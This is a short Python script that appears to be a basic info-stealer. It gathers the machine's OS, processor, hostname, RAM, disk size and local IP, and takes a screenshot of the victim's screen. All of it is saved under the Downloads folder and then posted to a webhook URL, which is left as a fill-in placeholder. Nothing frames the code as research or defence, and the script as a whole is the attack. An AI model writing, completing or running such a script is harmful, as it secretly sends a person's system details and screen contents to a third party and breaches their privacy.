import os
import platform
import socket
import psutil
import pyautogui
import requests


system_info = {
    'Operating System': platform.system(),
    'OS Version': platform.version(),
    'Processor': platform.processor(),
    'Hostname': socket.gethostname(),
    'RAM': f'{psutil.virtual_memory().total >> 30} GB',
    'Disk': f'{psutil.disk_usage("/").total >> 30} GB'
}


directory = os.path.join(os.path.expanduser("~"), 'Downloads', 'SystemInfo')
os.makedirs(directory, exist_ok=True)

# Create the system.txt file
system_file_path = os.path.join(directory, 'system.txt')
with open(system_file_path, 'w') as file:
    for key, value in system_info.items():
        file.write(f'{key}: {value}\n')

print(f"System information saved to {system_file_path}")

# Retrieve the IP address
ip_address = socket.gethostbyname(socket.gethostname())

# Create the internet.txt file
internet_file_path = os.path.join(directory, 'internet.txt')
with open(internet_file_path, 'w') as file:
    file.write(f'IP Address: {ip_address}\n')

print(f"IP address saved to {internet_file_path}")

# Capture and save a screenshot
screenshot_path = os.path.join(directory, 'screenshot.png')
pyautogui.screenshot(screenshot_path)

print(f"Screenshot saved to {screenshot_path}")


webhook_url = 'UR WEBHOOKKKK'


files = {
    'file1': ('system.txt', open(system_file_path, 'rb')),
    'file2': ('internet.txt', open(internet_file_path, 'rb')),
    'file3': ('screenshot.png', open(screenshot_path, 'rb'))
}

# Send the files to the webhook URL
response = requests.post(webhook_url, files=files)

